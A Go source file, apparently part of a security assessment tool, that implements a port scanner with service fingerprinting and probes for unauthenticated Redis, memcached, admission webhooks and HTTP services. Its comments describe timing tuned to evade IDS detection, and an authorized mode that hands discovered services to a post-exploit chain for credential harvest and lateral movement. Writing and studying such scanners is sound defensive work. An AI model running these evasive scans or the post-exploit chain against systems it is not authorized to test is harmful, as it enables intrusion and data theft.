// Package portscan implements a pure-Go TCP connect port scanner with service
// identification and unauthenticated-access probing for high-value services.
// No external binaries are required.
package portscan

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/postexploit"
	"github.com/stormbane-security/beacon/internal/scan"
)

func init() {
	scan.RegisterWithCheckDecls(scannerName, func(cfg scan.ScannerConfig) scan.Scanner {
		return NewWithNmap(cfg.Get("nmap.bin"))
	},
		scan.Check(finding.CheckPortServiceDiscovered, finding.SeverityInfo, finding.ModeSurface),
		scan.Check(finding.CheckNetDeviceUniFiExposed, finding.SeverityHigh, finding.ModeSurface),
		scan.Check(finding.CheckCVEUniFiLog4Shell, finding.SeverityCritical, finding.ModeSurface),
		scan.Check(finding.CheckNetDeviceTPLinkOmada, finding.SeverityHigh, finding.ModeSurface),
		scan.Check(finding.CheckCVETPLinkOmadaRCE, finding.SeverityCritical, finding.ModeSurface),
	)
}

const scannerName = "portscan"

// scanTypeKey is a context key for passing the scan type to probes.
type scanTypeKeyT struct{}

var scanTypeKey = scanTypeKeyT{}

// References for planned SMB probing — suppress unused warnings.
var (
	_ = probeSMBNullSession
)

// withScanType stores the scan type in the context.
func withScanType(ctx context.Context, st module.ScanType) context.Context {
	return context.WithValue(ctx, scanTypeKey, st)
}

// timeouts for the various probe stages.
const (
	dialTimeout   = 3 * time.Second
	bannerTimeout = 2 * time.Second
	httpTimeout   = 5 * time.Second
)

// defaultConcurrency is the number of ports probed simultaneously.
// 5 is a conservative ceiling that keeps concurrent SYN packets below the
// threshold most IDS/IPS engines use to trigger port-scan signatures
// (typically 10–15 half-open connections per second from a single source).
// Deep mode uses the same limit; the larger port list naturally takes longer.
const defaultConcurrency = 5

// interConnectDelay is the pause between acquiring the semaphore and dialling.
// Spreading connects by 50 ms per slot avoids the burst of simultaneous SYN
// packets that triggers stateful IDS engines even at low concurrency.
const interConnectDelay = 50 * time.Millisecond

// portEntry describes a single port that the scanner knows about.
type portEntry struct {
	port        int
	service     string
	criticalOnly bool // included in surface (critical) scan, not just deep
}

// criticalPorts are always scanned (surface + deep). Ordered by impact.
var criticalPorts = []portEntry{
	{6379, "redis", true},
	{9200, "elasticsearch", true},
	{2375, "docker", true},
	{10250, "kubelet", true},
	{27017, "mongodb", true},
	{9090, "prometheus", true},
	{5432, "postgresql", true},
	{3306, "mysql", true},
	{3389, "rdp", true},
	{5900, "vnc", true},
	{23, "telnet", true},
}

// highPorts are included in surface scans alongside critical ports.
var highPorts = []portEntry{
	{21, "ftp", false},
	{22, "ssh", false},
	{445, "smb", false},
	{1433, "mssql", false},
	{1521, "oracle", false},
	{2376, "docker-tls", false},
	{2379, "etcd", false},
	{2380, "etcd-peer", false},
	{10255, "kubelet-readonly", false},
	{5672, "amqp", false},
	{5985, "winrm-http", false},
	{5986, "winrm-https", false},
	{6443, "k8s-api", false},
	{8001, "k8s-proxy", false},
	{8089, "splunk-mgmt", false},
	{8160, "juniper-adf", false},  // Juniper PTX On-Box Anomaly Detection Framework (CVE-2026-21902)
	{11434, "ollama", false},      // Ollama LLM inference server (no auth by default)
	{1883, "mqtt", false},         // MQTT broker (plaintext, often no auth)
	{5060, "sip", false},          // SIP VoIP server
	{554, "rtsp", false},          // RTSP video streams / IP cameras
	{631, "ipp", false},           // IPP network printing
	{3260, "iscsi", false},        // iSCSI storage target
	{502, "modbus", false},        // Modbus TCP SCADA/ICS
	{830, "netconf", false},       // NETCONF network device management
	{16992, "intel-amt", false},    // Intel AMT management interface — CVE-2017-5689 empty-digest auth bypass
	{8000, "salt-api", false},      // SaltStack Salt API — CVE-2021-25281/25282 unauth RCE
	{8291, "winbox", false},       // MikroTik Winbox management
	{623, "ipmi", false},          // IPMI/BMC server management
	{8443, "https-alt", false},    // HTTPS alt (network device web UIs)
	{8200, "vault", false},
	{8500, "consul", false},
	{5601, "kibana", false},
	{5984, "couchdb", false},
	{9042, "cassandra", false},
	{9092, "kafka", false},
	{11211, "memcached", false},
	{8888, "jupyter", false},
	{9300, "elasticsearch-transport", false},
	{15672, "rabbitmq-mgmt", false},
	{28017, "mongodb-http", false},
	// Email servers — SMTP (submission) and IMAP exposed to internet
	{25, "smtp", false},           // SMTP MTA port — banner reveals software/version
	{587, "smtp-submission", false}, // SMTP submission — often auth-required
	{143, "imap", false},          // IMAP mail access
	{993, "imaps", false},         // IMAP over TLS
	{110, "pop3", false},          // POP3 mail access
	{995, "pop3s", false},         // POP3 over TLS
	// Directory services — LDAP/AD/Kerberos exposed to internet is critical
	{389, "ldap", false},          // LDAP — null bind reveals domain info
	{636, "ldaps", false},         // LDAP over TLS
	{88, "kerberos", false},       // Kerberos KDC — confirms AD domain controller
	{3268, "gc", false},           // AD Global Catalog
	{3269, "gc-ssl", false},       // AD Global Catalog over TLS
	// Erlang/OTP ecosystem
	{4369, "epmd", false},         // Erlang Port Mapper Daemon — lists all Erlang nodes unauthenticated
	// DNS servers
	{53, "dns", false},            // DNS server — open resolver test, version disclosure
	// WINS / NetBIOS name service
	{1512, "wins", false},         // WINS server — Samba CVE-2025-10230 context
}

// extendedPorts are added in deep mode only.
var extendedPorts = []portEntry{
	{2181, "zookeeper", false},
	{4567, "sinatra", false},
	{4848, "glassfish-admin", false},
	{7001, "weblogic", false}, // also in webServicePorts; CVE-2026-21962 CVSS 10.0 warrants deep coverage
	{7474, "neo4j", false},
	{8080, "http-alt", false},
	{8086, "influxdb", false},
	// 8443 is already in highPorts; no duplicate here.
	{9000, "sonarqube", false},
	{9001, "minio-console", false},
	{9043, "websphere-admin", false},
	{9091, "prometheus-pushgateway", false},
	{9100, "jetdirect", false},    // JetDirect/PJL raw print — also used for Prometheus node-exporter
	// Port 9200 is shared by Elasticsearch and OpenSearch; already declared above as "elasticsearch".
	{2049, "nfs", false},
	{111, "rpcbind", false},
	{4200, "angular-dev", false},
	{5000, "flask-dev", false},
	{3000, "node-dev", false},
	{16686, "jaeger-ui", false},
	{5173, "vite-dev", false},     // Vite dev server — common in staging/CI
	{7860, "gradio", false},       // Gradio ML demo server
	{3001, "anythingllm", false},  // AnythingLLM (default port)
	{10000, "webmin", false},      // Webmin server management
	{19999, "netdata", false},     // Netdata monitoring
	{55000, "wazuh-api", false},   // Wazuh security platform API
	{9401, "veeam-mgmt", false},   // Veeam Backup & Replication
	{9419, "veeam-catalog", false}, // Veeam Catalog Service
	// ── Industrial Control Systems (ICS/SCADA/OT) ──────────────────────────
	{102, "s7comm", false},        // Siemens S7 PLC (COTP/ISO-on-TCP) — CRITICAL, any exposure
	{44818, "ethernet-ip", false}, // EtherNet/IP (Rockwell/Allen-Bradley) PLCs — CRITICAL
	{20000, "dnp3", false},        // DNP3 electric utility SCADA — CRITICAL
	{47808, "bacnet", false},      // BACnet building automation — HIGH
	// ── Telecom / VoIP ─────────────────────────────────────────────────────
	{5038, "asterisk-ami", false}, // Asterisk Manager Interface — plaintext admin API
	{4569, "iax2", false},         // IAX2 (Inter-Asterisk eXchange) VoIP
	// ── Network device management ───────────────────────────────────────────
	{8728, "routeros-api", false}, // MikroTik RouterOS API (plaintext)
	{264, "checkpoint-topology", false}, // Check Point FW-1 topology / cpstat discovery
	{179, "bgp", false},               // BGP routing protocol — internet-facing router exposure
	{9998, "tika-server", false},        // Apache Tika Server REST API — CVE-2018-1335 header injection RCE
	{8088, "superset", false},           // Apache Superset BI — CVE-2023-27524 default SECRET_KEY session forge
	{8123, "clickhouse", false},         // ClickHouse analytics DB HTTP interface
	{8222, "nats-monitoring", false},    // NATS message broker monitoring API — multiple auth bypass CVEs
	{8265, "ray-dashboard", false},      // Ray distributed ML dashboard (no auth by default)
	{9097, "tekton-dashboard", false},   // Tekton Pipelines dashboard (no auth by default)
	{30000, "sglang", false},            // SGLang LLM inference server (no auth by default)
	{61616, "activemq", false},          // Apache ActiveMQ broker — CVE-2023-46604 pre-auth RCE (CVSS 10.0, KEV)
	{8009, "ajp", false},               // Tomcat AJP connector — CVE-2020-1938 GhostCat file read/RCE (CVSS 9.8, KEV)
	{8188, "comfyui", false},            // ComfyUI Stable Diffusion web UI (no auth by default)
	{8006, "proxmox", false},            // Proxmox VE hypervisor management UI
	{4786, "cisco-smart-install", false}, // Cisco IOS Smart Install — CVE-2018-0171 unauth config read/write (CVSS 9.8, KEV)
	{8848, "nacos", false},              // Nacos service discovery / config center — default nacos:nacos creds
	{8081, "artifactory", false},        // JFrog Artifactory repository manager — default admin:password
	{8082, "artifactory-alt", false},    // JFrog Artifactory (newer default port)
	{50051, "grpc", false},              // gRPC server — reflection endpoint may list all services unauthenticated
	// ── Wireless management infrastructure ──────────────────────────────────
	{8880, "unifi-portal", false},       // Ubiquiti UniFi HTTP guest captive portal
	{8843, "unifi-portal-tls", false},   // Ubiquiti UniFi HTTPS guest captive portal
	{4343, "aruba-instant", false},      // Aruba Instant Access Point HTTPS management
	{8043, "omada-alt", false},          // TP-Link Omada controller (alternate port)
}

// Scanner is a pure-Go TCP connect port scanner.
// When nmapBin is set, nmap is run after the TCP connect scan for service
// version detection and NSE script checks.
type Scanner struct {
	nmapBin string
	// Ports, when non-empty, overrides the default port list. Only these
	// ports are scanned. Used by drydock tests to scope scans to the
	// service under test.
	Ports []int
}

// New returns a new Scanner without nmap integration.
func New() *Scanner { return &Scanner{} }

// NewWithNmap returns a Scanner that runs nmap against confirmed open ports
// after the pure-Go TCP connect phase. nmapBin must be an absolute path to
// the nmap binary (e.g. "/usr/bin/nmap"). Pass "" to disable nmap.
func NewWithNmap(nmapBin string) *Scanner { return &Scanner{nmapBin: nmapBin} }

// AllKnownPorts returns the set of all port numbers covered by the static port
// lists (critical + high + extended). Used by the AI port advisor to avoid
// re-suggesting ports that are already scanned by default.
func AllKnownPorts() []int {
	// Pre-allocate to avoid mutating the backing arrays of the package-level slices.
	all := make([]portEntry, 0, len(criticalPorts)+len(highPorts)+len(extendedPorts))
	all = append(all, criticalPorts...)
	all = append(all, highPorts...)
	all = append(all, extendedPorts...)
	ports := make([]int, 0, len(all))
	for _, e := range all {
		ports = append(ports, e.port)
	}
	return ports
}

// Name returns the scanner identifier.
func (s *Scanner) Name() string { return scannerName }

// maxPortFindings caps the number of port findings reported to avoid
// overwhelming output when many ports are open (e.g., a router or honeypot).
// The most impactful ports (critical) are scanned first, so the cap
// preserves the highest-value findings.
const maxPortFindings = 50

// Run executes the port scan against asset, returning all findings.
// Surface mode scans the top 30 most impactful ports (critical + high).
// Deep mode scans all 50+ ports including the extended list.
func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	// Store scan type in context so probes can check for authorized mode.
	ctx = withScanType(ctx, scanType)

	// If the asset includes a port (e.g. "host:9122"), extract it so we
	// scan that specific port in addition to the standard list.
	host, targetPort := parseAssetPort(asset)
	if host != "" {
		asset = host
	}

	var ports []portEntry
	if len(s.Ports) > 0 {
		// Explicit port list from --ports flag — scan only these.
		for _, p := range s.Ports {
			ports = append(ports, portEntry{p, "unknown", true})
		}
	} else {
		ports = buildPortList(scanType)
	}

	// Inject the user-specified port if it isn't already in the list.
	if targetPort > 0 {
		found := false
		for _, e := range ports {
			if e.port == targetPort {
				found = true
				break
			}
		}
		if !found {
			// Prepend so it's scanned first — it's what the user asked for.
			ports = append([]portEntry{{targetPort, "unknown", false}}, ports...)
		}
	}

	type result struct {
		entry portEntry
		open  bool
		banner string
	}

	results := make(chan result, len(ports))
	sem := make(chan struct{}, defaultConcurrency)
	var wg sync.WaitGroup

	for _, entry := range ports {
		// Stagger goroutine launches before starting each one. Placing the delay
		// here (not inside the goroutine) ensures SYN packets are spread across
		// time even when multiple semaphore slots are available simultaneously.
		// At 50 ms per port with 30 ports this adds ~1.5 s overhead — acceptable
		// for a scan that would otherwise fire 30 near-simultaneous SYNs.
		select {
		case <-ctx.Done():
			goto collectResults
		case <-time.After(interConnectDelay):
		}

		wg.Add(1)
		go func(e portEntry) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			open, banner := probePort(ctx, asset, e.port)
			results <- result{entry: e, open: open, banner: banner}
		}(entry)
	}

collectResults:
	go func() {
		wg.Wait()
		close(results)
	}()

	var findings []finding.Finding
	openPorts := make(map[int]string)
	totalScanned := 0
	for r := range results {
		totalScanned++
		if !r.open {
			continue
		}
		openPorts[r.entry.port] = r.entry.service
		fs := buildFindings(ctx, asset, r.entry, r.banner)
		findings = append(findings, fs...)
		// Update service name from probe-identified findings. When --ports
		// is used, the initial portEntry has service="unknown". The probe
		// registry identifies the actual service (e.g. "redis") and stores
		// it in the service_identified finding's evidence. Use that for
		// accurate post-exploit module routing.
		for _, f := range fs {
			if f.CheckID == finding.CheckPortServiceIdentified {
				if svc, ok := f.Evidence["service"].(string); ok && svc != "" {
					openPorts[r.entry.port] = svc
				}
			}
		}
		// Emit a service-discovered hint for web-like services on non-standard ports.
		// The surface module picks these up to schedule a full per-port classify pass.
		if hint := EmitPortServiceDiscovered(asset, r.entry.port, r.entry.service, r.banner); hint != nil {
			findings = append(findings, *hint)
		}
	}

	// Transparent proxy / honeypot detection: if 80%+ of scanned ports
	// responded as open, the host is likely behind a transparent proxy or
	// is a honeypot. Individual port findings are unreliable in this case.
	if totalScanned >= 10 && len(openPorts)*100/totalScanned >= 80 {
		return []finding.Finding{{
			CheckID:  finding.CheckPortServiceDiscovered,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityInfo,
			Asset:    asset,
			Title:    fmt.Sprintf("Transparent proxy or honeypot detected on %s (%d/%d ports open)", asset, len(openPorts), totalScanned),
			Description: fmt.Sprintf(
				"%d out of %d scanned ports responded as open, which indicates a transparent "+
					"proxy, firewall SYN-ACK reflection, or honeypot. Individual port findings "+
					"are suppressed because they are unreliable in this scenario.",
				len(openPorts), totalScanned),
			Evidence: map[string]any{
				"open_count":    len(openPorts),
				"scanned_count": totalScanned,
				"ratio_pct":     len(openPorts) * 100 / totalScanned,
			},
			DiscoveredAt: time.Now(),
		}}, nil
	}

	// Authorized mode: run post-exploit chain against discovered services.
	// This runs BEFORE nmap because chain findings (credential harvest,
	// data extraction, lateral movement) are higher value and faster than
	// nmap vuln scripts. Nmap is supplementary and can take 5+ minutes.
	if scanType == module.ScanAuthorized && ctx.Err() == nil {
		host, _ := parseAssetPort(asset)
		if host == "" {
			host = asset
		}
		if len(openPorts) > 0 {
			chain := postexploit.NewChain()
			chain.Timeout = 2 * time.Minute // tighter timeout within portscan context
			chain.ApproveFunc = postexploit.ApproveFuncFromContext(ctx)
			fb := &postexploit.FindingBuilder{
				Module:  "surface",
				Scanner: scannerName,
				Asset:   asset,
			}
			// Pass service map so chain only probes modules matching
			// identified services, not all 16 modules on non-standard ports.
			chainFindings := chain.ProbeHostServices(ctx, host, openPorts, fb)
			findings = append(findings, chainFindings...)
		}
	}

	// Run nmap against confirmed open ports for service version + NSE scripts.
	// Nmap results supplement (not replace) the pure-Go scan findings — Go TCP
	// findings are always emitted regardless of whether nmap is available.
	if nmapFs := s.runNmap(ctx, asset, openPorts, scanType); len(nmapFs) > 0 {
		findings = append(findings, nmapFs...)
	}

	// Run UDP probes for services not reachable via TCP connect.
	// Deep mode runs all UDP probes; surface mode runs the basic set only.
	if ctx.Err() == nil {
		if udpFs := runUDP(ctx, asset, scanType); len(udpFs) > 0 {
			findings = append(findings, udpFs...)

			// Authorized mode: route UDP-discovered services into postexploit chain.
			// UDP services (SNMP, DNS, TFTP, etc.) need exploitation too.
			if scanType == module.ScanAuthorized && ctx.Err() == nil {
				host, _ := parseAssetPort(asset)
				if host == "" {
					host = asset
				}
				udpServices := make(map[int]string)
				for _, f := range udpFs {
					if svc, ok := f.Evidence["service"].(string); ok {
						if p, ok := f.Evidence["port"].(int); ok {
							udpServices[p] = svc
						}
					}
				}
				if len(udpServices) > 0 {
					chain := postexploit.NewChain()
					chain.Timeout = 2 * time.Minute
					chain.ApproveFunc = postexploit.ApproveFuncFromContext(ctx)
					fb := &postexploit.FindingBuilder{
						Module:  "surface",
						Scanner: scannerName,
						Asset:   asset,
					}
					chainFindings := chain.ProbeHostServices(ctx, host, udpServices, fb)
					findings = append(findings, chainFindings...)
				}
			}
		}
	}

	// Cap total findings to avoid overwhelming output when many ports are open
	// (e.g. a honeypot or misconfigured device with dozens of open services).
	if len(findings) > maxPortFindings {
		findings = findings[:maxPortFindings]
	}

	return findings, nil
}

// parseAssetPort splits an asset string into host and port. If the asset
// contains no port or the port is invalid, it returns ("", 0).
func parseAssetPort(asset string) (host string, port int) {
	h, pStr, err := net.SplitHostPort(asset)
	if err != nil {
		return "", 0
	}
	p, err := strconv.Atoi(pStr)
	if err != nil || p <= 0 || p > 65535 {
		return "", 0
	}
	return h, p
}

// buildPortList assembles the ordered port list for the given scan type.
func buildPortList(scanType module.ScanType) []portEntry {
	ports := make([]portEntry, 0, len(criticalPorts)+len(highPorts)+len(extendedPorts))
	ports = append(ports, criticalPorts...)
	ports = append(ports, highPorts...)
	if scanType == module.ScanDeep || scanType == module.ScanAuthorized {
		ports = append(ports, extendedPorts...)
	}
	return ports
}

// probePort attempts a TCP connection to host:port.
// Returns (open, banner). The banner may be empty.
func probePort(ctx context.Context, host string, port int) (bool, string) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false, ""
	}
	defer func() { _ = conn.Close() }()

	// Attempt a passive banner grab: set a short read deadline and read whatever
	// the server sends before we've said anything.
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	banner := strings.TrimSpace(string(buf[:n]))
	return true, banner
}

// buildFindings interprets an open port and returns the appropriate findings.
// For high-value services it performs a deeper probe; others are flagged on
// connectivity alone.
//
// Probes registered in the probeRegistry run first (port-independent detection).
// The legacy switch block handles services not yet migrated to the probe system.
func buildFindings(ctx context.Context, asset string, entry portEntry, banner string) []finding.Finding {
	port := entry.port
	now := time.Now()

	makeF := func(
		checkID finding.CheckID,
		severity finding.Severity,
		title, description string,
		evidence map[string]any,
	) finding.Finding {
		return finding.Finding{
			CheckID:      checkID,
			Module:       "surface",
			Scanner:      scannerName,
			Severity:     severity,
			Title:        title,
			Description:  description,
			Asset:        asset,
			Evidence:     evidence,
			DiscoveredAt: now,
		}
	}

	// Run probe registry — detects services by protocol/response fingerprinting
	// regardless of which port they're on.
	return runProbes(ctx, asset, port, banner, makeF)
}

// webServicePorts are ports that host HTTP services and warrant their own
// classify + playbook matching pass in the surface module.
// Non-standard HTTP ports on the same host may be running completely different
// software (e.g. Grafana on :3000 alongside nginx on :80) — each should be
// fingerprinted and scanned independently.
var webServicePorts = map[int]string{
	3000:  "node/grafana",
	3001:  "node-alt",
	4200:  "angular-dev",
	5000:  "flask-dev",
	5601:  "kibana",
	7474:  "neo4j-browser",
	8001:  "k8s-proxy",
	8080:  "http-alt",
	8200:  "vault",
	8000:  "salt-api",
	8086:  "influxdb",
	16992: "intel-amt",
	8089:  "splunk-mgmt",
	8443:  "https-alt",
	8500:  "consul",
	8888:  "jupyter",
	9000:  "sonarqube",
	11434: "ollama",
	9001:  "minio-console",
	9090:  "prometheus",
	9091:  "prometheus-pushgateway",
	9200:  "elasticsearch",
	15672: "rabbitmq-mgmt",
	8088:  "superset",
	8123:  "clickhouse",
	8222:  "nats-monitoring",
	8265:  "ray-dashboard",
	9097:  "tekton-dashboard",
	30000: "sglang",
	61616: "activemq",
	8009:  "ajp-tomcat",
	8188:  "comfyui",
	8006:  "proxmox",
	19999: "netdata",
	16686: "jaeger-ui",
	4848:  "glassfish-admin",
	7001:  "weblogic",
	9043:  "websphere-admin",
	5173:  "vite-dev",
	7860:  "gradio",
	10000: "webmin",
	55000: "wazuh-api",
	9401:  "veeam-mgmt",
	9419:  "veeam-catalog",
	4786:  "cisco-smart-install",
	8848:  "nacos",
	8081:  "artifactory",
	8082:  "artifactory-alt",
	// Wireless management
	8880:  "unifi-portal",
	8843:  "unifi-portal-tls",
	4343:  "aruba-instant",
	8043:  "omada-alt",
}

// EmitPortServiceDiscovered returns a CheckPortServiceDiscovered finding when
// an open port hosts an HTTP service that deserves its own fingerprint pass.
// The surface module extracts these findings and schedules host:port as assets.
//
// To avoid false positives (e.g. a binary protocol on port 8080), we verify
// the banner looks like an HTTP response before emitting the finding.
func EmitPortServiceDiscovered(asset string, port int, service, banner string) *finding.Finding {
	if _, ok := webServicePorts[port]; !ok {
		return nil
	}
	// Verify the banner contains HTTP response indicators. A non-HTTP service
	// on a web-associated port (e.g. custom binary protocol on 8080) should
	// not trigger a classify+playbook pass.
	if banner != "" && !looksLikeHTTP(banner) {
		return nil
	}
	f := finding.Finding{
		CheckID:  finding.CheckPortServiceDiscovered,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityInfo,
		Asset:    asset,
		Title:    fmt.Sprintf("Web service discovered on %s port %d (%s)", asset, port, service),
		Description: fmt.Sprintf(
			"Port %d on %s is open and hosts an HTTP service (%s). "+
				"This port will be fingerprinted and scanned independently from the default HTTP port, "+
				"as it may be running different software with its own vulnerabilities.",
			port, asset, service,
		),
		Evidence: map[string]any{
			"port":       port,
			"service":    service,
			"banner":     banner,
			"port_asset": fmt.Sprintf("%s:%d", asset, port),
		},
	}
	return &f
}

// looksLikeHTTP returns true if the banner contains signals that indicate an
// HTTP service: status line, common HTTP headers, or HTML content.
func looksLikeHTTP(banner string) bool {
	upper := strings.ToUpper(banner)
	// HTTP status line: "HTTP/1.0", "HTTP/1.1", "HTTP/2"
	if strings.Contains(upper, "HTTP/") {
		return true
	}
	// Common HTTP response headers
	for _, h := range []string{"CONTENT-TYPE:", "SERVER:", "X-POWERED-BY:", "SET-COOKIE:", "LOCATION:"} {
		if strings.Contains(upper, h) {
			return true
		}
	}
	// HTML content
	if strings.Contains(upper, "<HTML") || strings.Contains(upper, "<!DOCTYPE") {
		return true
	}
	return false
}

// ── Service-specific probes ───────────────────────────────────────────────────

// probeRedis sends a Redis PING command, checks for +PONG, then queries
// INFO server to extract the server version. Returns (unauthenticated, version).
// version is "" when not readable (e.g. auth required or connection issue).
func probeRedis(ctx context.Context, host string, port int) (bool, string) {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false, ""
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	// RESP inline PING
	_, err = conn.Write([]byte("*1\r\n$4\r\nPING\r\n"))
	if err != nil {
		return false, ""
	}
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if !strings.Contains(string(buf[:n]), "+PONG") {
		return false, ""
	}
	// Server is unauthenticated — query INFO server for version.
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	_, err = conn.Write([]byte("*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n"))
	if err != nil {
		return true, ""
	}
	info := make([]byte, 4096)
	n, _ = conn.Read(info)
	version := parseRedisVersion(string(info[:n]))
	return true, version
}

// parseRedisVersion extracts the version from an INFO server response.
// Looks for "redis_version:x.y.z" in the bulk string reply.
func parseRedisVersion(info string) string {
	const prefix = "redis_version:"
	idx := strings.Index(info, prefix)
	if idx < 0 {
		return ""
	}
	rest := info[idx+len(prefix):]
	end := strings.IndexAny(rest, "\r\n")
	if end < 0 {
		return strings.TrimSpace(rest)
	}
	return strings.TrimSpace(rest[:end])
}

// isVulnerableRedis returns true when the Redis version is affected by
// CVE-2025-49844 (unauthenticated RCE via Lua scripting, CVSS 9.8).
// Affected: < 7.2.11, < 7.4.6, < 8.0.4, < 8.2.2.
// Patched:  7.2.11+, 7.4.6+, 8.0.4+, 8.2.2+.
func isVulnerableRedis(version string) bool {
	parts := strings.SplitN(version, ".", 3)
	if len(parts) < 2 {
		return false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		return false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return false
	}
	patch := 0
	if len(parts) == 3 {
		patch, _ = strconv.Atoi(parts[2])
	}
	switch {
	case major < 7:
		return true // all older majors unpatched
	case major == 7 && minor == 2:
		return patch < 11
	case major == 7 && minor == 4:
		return patch < 6
	case major == 7:
		// 7.0, 7.1, 7.3, etc. are EOL and unpatched for this CVE
		return true
	case major == 8 && minor == 0:
		return patch < 4
	case major == 8 && minor == 2:
		return patch < 2
	case major == 8:
		// 8.1, 8.3, etc. — no patch listed for these minor versions
		return true
	default:
		return false
	}
}

// probeHTTP sends a plain-HTTP GET and returns true if the server responds 200.
// If useTLS is true it uses HTTPS with TLS verification disabled.
// probeHTTPBody makes a GET request and returns (body, true) on HTTP 200,
// ("", false) otherwise. Used when the response body is needed to distinguish
// between services that share a port (e.g. Elasticsearch vs OpenSearch on 9200).
func probeHTTPBody(ctx context.Context, host string, port int, useTLS bool, path string) (string, bool) {
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, path)
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return "", false
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", false
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		return "", false
	}
	b, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return "", true // connected but couldn't read body
	}
	return string(b), true
}

func probeHTTP(ctx context.Context, host string, port int, useTLS bool, path string) bool {
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, path)

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // intentional for security probe
		DialContext: (&net.Dialer{Timeout: dialTimeout}).DialContext,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: transport,
		// Do not follow redirects — a 302 to /login means auth is required.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() { _ = resp.Body.Close() }()
	return resp.StatusCode == http.StatusOK
}

// probeIngressAdmissionWebhook probes port 8443 for an exposed ingress-nginx
// admission controller webhook (CVE-2025-1974, IngressNightmare). It POSTs a
// minimal AdmissionReview JSON and returns the response body if the endpoint
// looks like a Kubernetes admission webhook (body contains "AdmissionReview"
// or "admission.k8s.io"). Returns "" when no webhook is detected.
func probeIngressAdmissionWebhook(ctx context.Context, host string, port int) string {
	url := fmt.Sprintf("https://%s:%d/admission", host, port)
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: transport,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	body := `{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{}}`
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url,
		strings.NewReader(body))
	if err != nil {
		return ""
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer func() { _ = resp.Body.Close() }()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return ""
	}
	s := string(b)
	if strings.Contains(s, "AdmissionReview") || strings.Contains(s, "admission.k8s.io") ||
		(strings.Contains(s, "admission") && strings.Contains(s, "ingress")) {
		return s
	}
	return ""
}

// probeMemcached sends the ASCII stats command and checks for STAT in the response.
func probeMemcached(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))
	_, err = conn.Write([]byte("stats\r\n"))
	if err != nil {
		return false
	}
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	return strings.Contains(string(buf[:n]), "STAT ")
}

// probeJupyter does an HTTP GET / and checks for "jupyter" in the response body.
func probeJupyter(ctx context.Context, host string, port int) bool {
	url := fmt.Sprintf("http://%s:%d/", host, port)
	transport := &http.Transport{
		DialContext: (&net.Dialer{Timeout: dialTimeout}).DialContext,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: transport,
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() { _ = resp.Body.Close() }()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(body)), "jupyter")
}

